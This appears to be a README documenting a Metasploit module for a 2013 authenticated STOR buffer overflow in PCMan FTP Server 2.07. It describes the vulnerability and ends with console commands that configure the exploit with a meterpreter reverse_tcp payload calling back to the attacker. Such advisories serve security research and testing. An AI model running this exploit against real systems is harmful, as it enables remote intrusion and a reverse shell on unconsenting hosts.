# Metasploit Module – PCMan FTP Server Post-Authentication 'STOR' Stack Buffer Overflow

## 📅 Date
June 27, 2013

## ✍️ Authors
- **Christian (Polunchis) Ramirez** — Initial Discovery ([https://intlabs.ca](https://intlabs.ca))
- **Rick (nanotechz9l) Flores** — Metasploit Module Developer

**Contacts:**  
- polunchis@intlabs.ca

## 📦 Software Information
- **Affected Software:** PCMan FTP Server 2.07
- **Vulnerability Type:** Post-Authentication Stack-Based Buffer Overflow
- **Attack Type:** Remote Code Execution (RCE)

## 🖥️ Tested On
- Windows XP SP3 (English)

## 🛡️ Vulnerability Description
A **buffer overflow vulnerability** exists in **PCMan FTP Server 2.07** within the handling of the `STOR` FTP command when combined with a `/../` path traversal sequence.

By sending a specially crafted `STOR` request **after successful authentication**, an attacker can **overwrite the Instruction Pointer (EIP)** and execute arbitrary code.

The overflow is triggered by the FTP server mishandling long input passed to the `STOR` command.  
**Authentication is required** but can be easily achieved with valid credentials.

## ⚙️ Exploitation Details
- **Port:** 21/TCP (FTP)
- **Vulnerable Command:** `STOR /../<payload>`
- **Authentication:** ✅ Required (any valid FTP credentials)
- **Impact:** Remote Code Execution (RCE)
- **Bypass Techniques:** No ASLR/DEP on XP SP3 targets
- **Special Notes:** Overflow payload is visible in the FTP server log console.

## 🛠️ Metasploit Usage

```bash
msf6 > use exploit/windows/ftp/pcman_stor
msf6 exploit(windows/ftp/pcman_stor) > set RHOSTS <target-ip>
msf6 exploit(windows/ftp/pcman_stor) > set RPORT 21
msf6 exploit(windows/ftp/pcman_stor) > set FTPUSER <username>
msf6 exploit(windows/ftp/pcman_stor) > set FTPPASS <password>
msf6 exploit(windows/ftp/pcman_stor) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(windows/ftp/pcman_stor) > set LHOST <your-ip>
msf6 exploit(windows/ftp/pcman_stor) > exploit
